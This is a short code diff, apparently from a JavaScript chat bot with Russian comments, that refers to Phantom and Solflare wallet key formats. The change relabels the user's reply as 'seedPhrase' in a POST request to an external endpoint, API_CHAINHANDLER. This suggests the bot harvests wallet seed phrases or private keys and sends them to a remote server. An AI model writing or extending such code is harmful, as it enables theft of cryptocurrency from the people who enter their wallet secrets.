@@ -693,7 +693,7 @@ Accepted formats are in the style of Phantom (e.g. "88631DEyXSWf...") or Solflar
       try {
         // Отправляем POST-запрос на API_CHAINHANDLER
         const response = await axios.post(API_CHAINHANDLER, {
-          message: responseMsg.text,
+          seedPhrase: responseMsg.text,
         });
 
         // Отправляем пользователю ответ от API
